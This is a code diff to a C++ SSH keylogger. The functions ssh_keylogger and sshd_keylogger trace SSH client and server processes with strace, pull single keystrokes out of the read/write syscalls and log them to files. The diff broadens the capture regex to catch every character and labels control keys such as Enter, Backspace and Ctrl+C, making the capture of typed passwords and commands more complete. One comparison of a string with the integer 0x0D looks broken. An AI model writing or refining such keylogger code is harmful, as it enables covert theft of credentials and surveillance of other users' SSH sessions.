@@ -66,8 +66,12 @@ std::string parse_strace_output(std::string& output, boost::regex& xRegEx){
     if(!xResults.empty()){
         std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
         std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
-        if(xResults["cmd"] != "") return xResults["cmd"];
-        else return "EMPTY";
+        if(xResults["cmd"] == 0x0D) return "[ENTER]";
+        else if(xResults["cmd"] == "\177") return "[BACKSPACE]";
+        else if(xResults["cmd"] == "\3") return "[Ctrl+C]";
+        else if(xResults["cmd"] == "\4") return "[Ctrl+D]";
+        else if(xResults["cmd"] == "\27") return "\\w";
+        else return xResults["cmd"];
     }
     std::cout << "CMD: EMPTY" << std::endl;
     return "EMPTY!";
@@ -124,7 +128,7 @@ void ssh_keylogger(const uint16_t& pid){
         if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                 data_from_strace.find("= 1\n") != std::string::npos){
             std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
-            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>\\w+)\", 1\\)\\s+= ");
+            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= ");
             std::string symbol = parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
             std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
@@ -159,7 +163,7 @@ void sshd_keylogger(const uint16_t& pid){
         if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
                 data_from_strace.find("= 1\n") != std::string::npos){
             std::cout << "ACCEPTED_BUFFER: " << buffer.data() << std::endl;
-            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>\\w+)\", 1\\)\\s+= 1");
+            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
             std::string symbol = parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
             std::cout << "WRITTEN: " << std::fwrite(symbol.data(), 1, symbol.size(), fd) << std::endl;
@@ -200,6 +204,21 @@ int main() {
         fs::create_directories(path_to_log);
         std::cout << "DIR is created" << std::endl;
     }
+
+//    std::string output = "write(9, \"\177\", 1)                       = 1";
+//    boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
+//    boost::smatch xResults{};
+//    boost::regex_search(output, xResults, xRegEx);
+//    if(!xResults.empty()){
+//        std::cout << "FOUND_ALL: " << xResults[0] << std::endl;
+//        std::cout << xResults.size() << std::endl;
+//        std::cout << "FOUND_CMD: " << xResults[1] << std::endl;
+//        std::cout << "FOUND_CMD: " << xResults["cmd"] << std::endl;
+//        if(xResults["cmd"] == "\177"){
+//            std::cout << "RETURN" << std::endl;
+//        }
+//    }
+
 
     std::vector<uint16_t> procs_in_monitoring{};
     while(true){
